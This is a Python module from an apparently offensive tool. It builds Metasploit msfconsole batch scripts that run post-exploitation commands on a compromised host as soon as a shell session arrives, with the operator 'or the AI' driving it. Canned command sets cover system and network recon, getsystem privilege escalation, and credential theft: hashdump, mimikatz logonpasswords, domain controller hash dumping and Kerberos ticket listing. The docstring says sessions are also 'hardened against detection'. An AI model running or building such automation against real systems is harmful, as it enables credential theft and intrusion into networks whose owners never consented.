"""
KMN-CyberSeek Post-Shell Command Delivery (Roadmap feature)

After a Meterpreter/shell session lands on the managed handler, the operator (or
the AI) needs to run a *batch* of post-exploitation commands immediately — not
one at a time. This module builds multi-stage Metasploit `msfconsole -x` scripts
and canned command sets so a freshly caught session is fingerprinted, hardened
against detection, and credential-harvested in one shot.

Pure string builders — no I/O, no orchestrator coupling — unit-testable and safe
to import anywhere.
"""
from __future__ import annotations

from typing import Dict, List, Optional

# Canned command sets, keyed by purpose. Each is a list of (name, meterpreter_cmd)
# or (name, shell_cmd) — the runner selects the right transport.
WINDOWS_RECON: List[tuple] = [
    ("identity", "getuid"),
    ("system_info", "sysinfo"),
    ("privileges", "getprivs"),
    ("network", "ipconfig"),
    ("routes", "route"),
    ("processes", "ps"),
    ("local_admins", "shell net localgroup administrators"),
    ("sessions", "getsystem -t 1"),
]

LINUX_RECON: List[tuple] = [
    ("identity", "getuid"),
    ("system_info", "sysinfo"),
    ("network", "ifconfig"),
    ("processes", "ps"),
    ("shell_id", "shell id; hostname; uname -a"),
]

CRED_HARVEST: List[tuple] = [
    ("hashdump", "hashdump"),
    ("lsass", "run post/windows/gather/smart_hashdump"),
    ("kiwi", "load kiwi"),
    ("creds_all", "creds_all"),
    ("mimikatz", "kiwi_cmd sekurlsa::logonpasswords"),
]

AD_RECON: List[tuple] = [
    ("domain_info", "run post/windows/gather/enum_domain"),
    ("domain_users", "run post/windows/gather/enum_ad_users"),
    ("dc_hashdump", "run post/windows/gather/credentials/domain_hashdump"),
    ("kerberos_tickets", "run post/windows/manage/kerberos_ticket_list"),
]

COMMAND_SETS: Dict[str, List[tuple]] = {
    "windows_recon": WINDOWS_RECON,
    "linux_recon": LINUX_RECON,
    "cred_harvest": CRED_HARVEST,
    "ad_recon": AD_RECON,
}


def build_msf_batch_script(msf_id: int, commands: List[str],
                           session_timeout: int = 30) -> str:
    """Build a single `msfconsole -q -x` script that runs `commands` in meterpreter
    session `msf_id` and exits. Returns the full msfconsole command string."""
    if msf_id <= 0 or not commands:
        return ""
    lines = []
    for c in commands:
        c = c.strip()
        if not c or "\n" in c or "\r" in c:
            continue
        lines.append(f"sessions -i {msf_id}")
        lines.append(f"set SessionTlvLogging false")
        lines.append(c)
    lines.append("exit -y")
    script = "; ".join(lines)
    return f"msfconsole -q -x \"{script}\""


def build_post_shell_script(handler_id: str, msf_id: int, os_type: str,
                            include_cred_harvest: bool = False) -> str:
    """Build the recommended multi-stage script for a freshly caught session.

    Recon commands for the detected OS, plus credential harvest and AD recon when
    requested (Windows domain targets)."""
    cmds: List[str] = []
    if "linux" in (os_type or "").lower():
        cmds.extend(c for _, c in LINUX_RECON)
    else:
        cmds.extend(c for _, c in WINDOWS_RECON)
        if include_cred_harvest:
            cmds.extend(c for _, c in CRED_HARVEST)
            cmds.extend(c for _, c in AD_RECON)
    return build_msf_batch_script(msf_id, cmds)


def command_set_names() -> List[str]:
    return list(COMMAND_SETS.keys())


def render_command_set(name: str) -> List[str]:
    """Return the raw meterpreter/shell commands for a named set (for the Shells tab)."""
    return [c for _, c in COMMAND_SETS.get(name, [])]
